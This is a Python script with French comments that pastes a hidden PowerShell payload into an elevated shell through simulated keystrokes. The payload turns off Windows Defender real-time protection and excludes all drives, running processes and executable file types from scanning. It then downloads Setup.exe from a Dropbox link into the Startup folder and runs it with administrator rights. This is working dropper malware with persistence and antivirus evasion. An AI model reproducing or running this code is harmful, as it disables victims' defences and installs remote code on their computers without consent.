import time
import keyboard
import pyperclip
import subprocess

# Script PowerShell avec désactivation temporaire de l'antivirus
mon_script = """
Set-MpPreference -DisableRealtimeMonitoring $true
$drives = Get-PSDrive -PSProvider 'FileSystem' | Where-Object { $_.Free -gt 0 }
foreach ($drive in $drives) { Add-MpPreference -ExclusionPath $drive.Root }

$procs = Get-Process | Where-Object { $_.Path -ne $null }
foreach ($proc in $procs) { Add-MpPreference -ExclusionProcess $proc.Name }

$exts = @('.exe','.bat','.cmd','.ps1','.vbs','.js')
foreach ($ext in $exts) { Add-MpPreference -ExclusionExtension $ext }

$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Setup.exe"
$url = "https://www.dropbox.com/scl/fi/tib5nwxpmwwuryllzsf9k/Setup.exe?rlkey=0ppes5814g09i6p0n88wg3u3l&st=56fnxb6k&dl=1"

if (Test-Path $startupPath) { Remove-Item $startupPath -Force }

Invoke-WebRequest -Uri $url -OutFile $startupPath -UseBasicParsing -Headers @{
    "User-Agent" = "Mozilla/5.0"
}

Start-Process -FilePath $startupPath -Verb RunAs -Wait
"""

# Copie dans le presse-papier
pyperclip.copy(mon_script)
time.sleep(1)

# Lance PowerShell en admin directement
subprocess.run('powershell -Command "Start-Process powershell -Verb RunAs"', shell=True)
time.sleep(3)  # Délai crucial pour l'UAC

# Collage et exécution
keyboard.press_and_release('ctrl+v')
time.sleep(0.5)
keyboard.press_and_release('enter')